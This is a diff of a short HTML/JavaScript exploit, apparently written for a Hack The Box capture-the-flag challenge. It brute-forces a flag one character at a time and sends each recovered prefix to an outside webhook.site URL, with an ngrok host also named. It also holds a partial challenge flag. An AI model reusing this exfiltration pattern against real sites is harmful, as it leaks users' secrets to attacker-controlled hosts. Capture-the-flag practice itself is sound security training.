@@ -1,7 +1,7 @@
 <html>
   <script>
     var ip = "127.0.0.1:1337"; // HTB Server IP Address
-    var flag = "HTB{"; // init search word
+    var flag = "HTB{5w33t__li3ndr3n_0f_min3__"; // init search word
     var letters =
       "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";
     var hook = "8281-171-252-154-17.ap.ngrok.io";
@@ -28,7 +28,7 @@
           (res) => {}
         );
         if (b) break;
-        fetch(`https://webhook.site/cfe28c83-12c7-4253-af1d-bec71258eb07/flag=${flag}`, { method: "get" });
+        fetch(`https://webhook.site/cfe28c83-12c7-4253-af1d-bec71258eb07/?flag=${flag}`, { method: "get" });
       }
     }
     getFullWord(letters);
